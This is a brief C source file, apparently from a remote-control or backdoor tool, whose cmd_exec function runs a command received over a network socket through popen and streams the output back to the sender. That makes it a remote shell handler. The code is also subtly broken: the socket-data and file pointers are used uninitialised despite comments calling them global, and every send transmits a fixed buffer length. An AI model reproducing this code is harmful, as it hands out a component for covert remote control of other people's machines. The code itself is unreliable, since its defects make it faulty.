#include "../master.h"
#include "cmd_exec.h"

STAT cmd_exec() 
{
	/* global socket data in master.h */
	SockData *Gsd;
	if (unlikely(0 == strlen(GetSDrdata(Gsd)))) {
		printf("can't get cmd\n");
		goto err;
	}
	
	/* execute command */

	/* global data file descriptor in master.h */
	FILE *g_dfp;
	g_dfp = popen(GetSDrdata(Gsd), "r");

	/* read data and send it in loop until file end */
	while(NULL != fgets(GetSDsdata(Gsd), DATA_LEN, g_dfp)) {
		printf("[-]\t%s", GetSDsdata(Gsd));
		send(GetSDfd(Gsd), GetSDsdata(Gsd), DATA_LEN, 0);
	}
	SendOverTag();
	pclose(g_dfp);
	
	return SUCCESS;
err:
	return FAILURE;
}
